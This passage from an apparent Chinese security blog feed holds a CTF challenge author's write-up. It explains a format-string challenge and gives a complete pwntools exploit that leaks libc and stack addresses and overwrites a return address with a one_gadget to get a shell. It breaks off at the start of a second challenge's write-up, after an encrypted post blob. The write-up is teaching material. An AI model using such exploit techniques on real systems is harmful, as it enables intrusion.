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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      一道比较新的题目，暂时不开放了，有思路欢迎交流.
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="PWNABLE.TW" scheme="http://p4nda.top/tags/PWNABLE-TW/"/>
    
  </entry>
  
  <entry>
    <title>胖哈勃Panda&#39;s gift 及 TSCTF 2018 FINAL出题笔记</title>
    <link href="http://p4nda.top/2018/06/25/pwnhub_Panda&#39;s_gift/"/>
    <id>http://p4nda.top/2018/06/25/pwnhub_Panda&#39;s_gift/</id>
    <published>2018-06-25T12:30:22.000Z</published>
    <updated>2018-10-03T12:48:47.473Z</updated>
    
    <content type="html"><![CDATA[<h1 id="胖哈勃Panda’s-gift出题"><a href="#胖哈勃Panda’s-gift出题" class="headerlink" title="胖哈勃Panda’s gift出题"></a>胖哈勃Panda’s gift出题</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目在main函数中首先提高了栈地址，去掉了部分栈地址随机化（后2字节），便于后续利用。</p><p>在init函数中，利用时间作为随机数种子，使用mmap伪随机生成2个内存块，地址可预测。作为题目中visitor_name、motto两个变量的可使用内存。</p><p>在login函数中，提供了三个功能。1. 向visitor_name赋值，长度最大为6字节。 2. 向motto赋值，长度最大为0x100字节。 3.打印motto的值。 </p><p>上述三个功能由一个全局变量flag控制每个功能仅能调用一次。</p><h2 id="漏洞设置"><a href="#漏洞设置" class="headerlink" title="漏洞设置"></a>漏洞设置</h2><p>1、 利用libc及固定时间，visitor_name、motto地址可预测。</p><p>2、 在login的set_name函数中，设置了一个6字节的格式化字符串漏洞，且漏洞仅能利用一次。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先，题目在编译时开启了RELRO、NX、CANARY保护，使得got表不可写、不能通过简单溢出利用漏洞。</p><h3 id="地址预测"><a href="#地址预测" class="headerlink" title="地址预测"></a>地址预测</h3><p>在链接远程服务器时同时启动脚本，利用python的cdll库与服务器同样的libc可以达到预测的两个地址的效果，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">  p = remote(<span class="string">'127.0.0.1'</span>,  <span class="number">9999</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc_run = CDLL(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc_run.srand(libc_run.time(<span class="number">0</span>))</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">v2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (v2 &lt;= <span class="number">0x10000</span> ):</span><br><span class="line">    v2 = libc_run.rand() &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">visitor_name =  v2</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((v2 &lt;= <span class="number">0x10000</span> )|(visitor_name == v2)):</span><br><span class="line">    v2 = libc_run.rand() &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">motto =  v2</span><br></pre></td></tr></table></figure><h3 id="printf格式化字符串利用"><a href="#printf格式化字符串利用" class="headerlink" title="printf格式化字符串利用"></a>printf格式化字符串利用</h3><p>因为题目本身仅存在一个显式漏洞，只能从该漏洞入手。</p><p>由于仅给了6字节的格式化字符串利用，因此考虑用%hn对rbp链写\x0000。</p><p>在0x400d31下断点后，可以看到栈结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rbp rsp  0x7ffc5dc00110 —▸ 0x7ffc5dc00120 —▸ 0x7ffc5dc00150 —▸ 0x7ffc5dc00180 ◂— ...</span><br><span class="line">01:0008│          0x7ffc5dc00118 —▸ 0x400d47 ◂— nop    </span><br><span class="line">02:0010│          0x7ffc5dc00120 —▸ 0x7ffc5dc00150 —▸ 0x7ffc5dc00180 —▸ 0x7ffc5df09410 ◂— ...</span><br><span class="line">03:0018│          0x7ffc5dc00128 —▸ 0x400eba ◂— jmp    0x400f4b</span><br><span class="line">04:0020│          0x7ffc5dc00130 ◂— 0x0</span><br><span class="line">05:0028│          0x7ffc5dc00138 ◂— 0x100400bf8</span><br><span class="line">06:0030│          0x7ffc5dc00140 —▸ 0x4010bc ◂— and    eax, 0x6e610064 /* &apos;%d&apos; */</span><br><span class="line">07:0038│          0x7ffc5dc00148 ◂— 0xcc345db59e141600</span><br></pre></td></tr></table></figure><p>当向rsp所指的位置利用 <strong>%6$hn</strong> 可以使得在函数返回到login函数时，login的rbp寄存器的后2字节被清零，造成栈迁移。而login函数在调用scanf函数时，使用rbp对格式化字符串寻址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400E0C                 mov     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000400E10                 mov     rsi, rdx</span><br><span class="line">.text:0000000000400E13                 mov     rdi, rax</span><br><span class="line">.text:0000000000400E16                 mov     eax, 0</span><br><span class="line">.text:0000000000400E1B                 call    __isoc99_scanf</span><br></pre></td></tr></table></figure><p>因此，可以控制scanf格式化字符串的地址。</p><h3 id="scanf格式化字符串控制"><a href="#scanf格式化字符串控制" class="headerlink" title="scanf格式化字符串控制"></a>scanf格式化字符串控制</h3><p>上一条讲了printf格式化字符串利用方法，而在调用printf格式化字符串前，可以利用set_motto函数预先在栈上布置好相关的地址。</p><p><strong><em>tip: 在出题时，我选择用抬高栈的方法使得使用printf格式化字符串利用后修改的rbp一定能落在set_motto使用过的栈中，set_motto从0xxxxxfffd0开始写入到0xxxxx00110结束，但由于栈是复用的，通过对题目调整，使得0xxxxxfffd0 - 0xxxxxffff8是不被栈的复用覆盖的。因此能保证做题时可以劫持栈地址，进一步劫持scanf格式化字符串</em></strong></p><p>在set_motto函数中填入 ‘scanf格式字符串’.ljust(0x20,’0’) + motto的地址，可以将scanf的格式化字符串劫持为用户输入的格式化字符串。且仅有0x20长度</p><p>由于栈上没有可以控制数据，所以并不能对内存地址任意写。</p><p>scanf的处理特性是按照每一个参数顺序处理的，因此利用栈上的rbp链（第10个参数、第16个参数分别是两个函数栈的ebp位置）特性，构造’%dq%10\$pq%16\$pq\0’，可以达到任意写且能保证正常逻辑不崩溃的目的。</p><h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>当前已经可以构造内存任意写了，任意写劫持motto指针为got地址，可以泄露libc地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">'3q'</span>+hex(<span class="number">0x602058</span>)+<span class="string">'q'</span>+hex(elf.got[<span class="string">'puts'</span>])+<span class="string">'q'</span>)</span><br></pre></td></tr></table></figure><p>由于flag变量限制，每个函数仅能调用1次，不能继续泄露了，所以对flag置零</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">'1q'</span>+hex(<span class="number">0x602050</span>)+<span class="string">'q'</span>+hex(<span class="number">0</span>)+<span class="string">'q'</span>)</span><br></pre></td></tr></table></figure><p>使用libc中的environ环境变量，可以泄露栈地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">'3q'</span>+hex(<span class="number">0x602058</span>)+<span class="string">'q'</span>+hex(libc.symbols[<span class="string">'environ'</span>])+<span class="string">'q'</span>)</span><br></pre></td></tr></table></figure><h3 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h3><p>由于存在canary，直接栈溢出不能用的，此时劫持控制流可以通过修改调用</p><p><strong>text:0000000000400E1B                 call    __isoc99_scanf</strong></p><p>处的返回地址，相当于函数自修改返回地址，将其修改为one_gadget，就可以拿到shell了。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./babyfmt'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./babyfmt'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc_run = CDLL(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc_run.srand(libc_run.time(<span class="number">0</span>))</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x400d31\nb *0x400e1b\n'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>,  <span class="number">9999</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc_run = CDLL(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc_run.srand(libc_run.time(<span class="number">0</span>))</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400e1b\n')</span></span><br><span class="line">v2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (v2 &lt;= <span class="number">0x10000</span> ):</span><br><span class="line">    v2 = libc_run.rand() &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">visitor_name =  v2<span class="comment">#mmap((void *)(signed int)v2, 0x1000uLL, 3, 34, -1, 0LL);</span></span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((v2 &lt;= <span class="number">0x10000</span> )|(visitor_name == v2)):</span><br><span class="line">    v2 = libc_run.rand() &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">motto =  v2<span class="comment">#mmap((void *)(signed int)v2, 0x1000uLL, 3, 34, -1, 0LL);   </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] motto '</span>,hex(motto) </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'motto:'</span>)</span><br><span class="line">p.sendline(<span class="string">'%dq%10$pq%16$pq\0'</span>.ljust(<span class="number">0x20</span>)+p64(motto))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.sendline(<span class="string">'%6$hn'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3q'</span>+hex(<span class="number">0x602058</span>)+<span class="string">'q'</span>+hex(elf.got[<span class="string">'puts'</span>])+<span class="string">'q'</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>) )- libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] system"</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1q'</span>+hex(<span class="number">0x602050</span>)+<span class="string">'q'</span>+hex(<span class="number">0</span>)+<span class="string">'q'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3q'</span>+hex(<span class="number">0x602058</span>)+<span class="string">'q'</span>+hex(libc.symbols[<span class="string">'environ'</span>])+<span class="string">'q'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline('1q'+hex(libc.symbols['__malloc_hook'])+'q'+hex(libc.address +0x4526a ))</span></span><br><span class="line"><span class="comment">#add("fmt",0x50,"%dp4nda%10$pp4nda%16$pp4nda\0","...".ljust(0x20,'c'))</span></span><br><span class="line"></span><br><span class="line">stack =  u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>) ) &amp;<span class="number">0xfffffffffff00000</span> <span class="number">-0x300000</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] stack"</span>,hex(stack)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1q'</span>+hex(<span class="number">0x602050</span>)+<span class="string">'q'</span>+hex(<span class="number">0</span>)+<span class="string">'q'</span>)</span><br><span class="line"><span class="comment">#p.recvuntil('&gt;')</span></span><br><span class="line"><span class="comment">#p.sendline('1q'+hex(motto+12)+'q'+hex(0x007073303824))</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1q'</span>+hex(stack+<span class="number">0x128</span>)+<span class="string">'q'</span>+hex(libc.address+<span class="number">0x4526a</span>)+<span class="string">'q'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526aexecve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>##other</p><p><a href="https://pwnhub.cn/questiondetail?id=42" target="_blank" rel="noopener">比赛网址</a></p><p><a href="https://pan.baidu.com/s/12blLzw1oafmQ3mCFYaa9NA" target="_blank" rel="noopener">题目链接</a> ， 密码： <strong><em>7nb6</em></strong></p><p>在*ctf 2018里出现过一道scanf格式字符串的利用，那题比较没有canary，使用%256s就溢出执行rop了。见到考察自构格式化字符串的比较少，所以搞了一题，利用思路和bss段上的printf格式化字符串是类似的，结合printf和scanf搞了一个格式化字符串漏洞大礼包。在编译题目时对栈重新构造了一下，避免了做题去碰随机化的尴尬，在scanf格式化字符串长度那里可以再减小一点，我用了15个字节，在题目中预留了32字节的长度。</p><p>由于自己太菜了，忘了libc函数是没有canary保护的，在劫持scanf格式化字符串那里本身就可以劫持scanf的返回地址写ROP了，失去了后面跳板构造内存任意写的作用了，如果那里有canary的话只能按照预期的方法来做了。</p><p>拿到一血、二血的<strong><em>test_for_pwn</em></strong>、<strong><em>Swings</em></strong> 大佬都是用这个非预期出的，觉得还是有点失落，但大佬们还是真的很强。</p><p>不过，这次比赛名称用了Panda’s gift真的是比较暖心了，虽然题目被非预期了，但是还是学到了很多东西。</p><p><img src="/img/Panda&#39;s gift/1-1.png" alt=""></p><h1 id="TSCTF-2018-FINAL-PWN1-Writeup"><a href="#TSCTF-2018-FINAL-PWN1-Writeup" class="headerlink" title="TSCTF 2018 FINAL PWN1 Writeup"></a>TSCTF 2018 FINAL PWN1 Writeup</h1><p>此题中留了3处可以获得flag的点</p><h2 id="伪随机数预测"><a href="#伪随机数预测" class="headerlink" title="伪随机数预测"></a>伪随机数预测</h2><p>题目中留了一个black-jack游戏，<a href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html" target="_blank" rel="noopener">代码</a>参考了pwnable.kr中题目的代码，但里面的漏洞和逻辑bug被我修复了，每一轮游戏可以下注，当达到一定分数时，可以拿到加密后的flag，此题问题在于初始化中调用了srand(time(0)/60)作为伪随机种子，只要在与服务器上程序启动的一分钟以内去生成随机数都是可以正确预测随机数的。相当于可以预测扑克牌生成的序列，当预测到这一轮电脑会赢的时候就下注$1，预测自己会赢的话就全部下注，过不了几轮就可以拿到加密后的flag，解密就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span 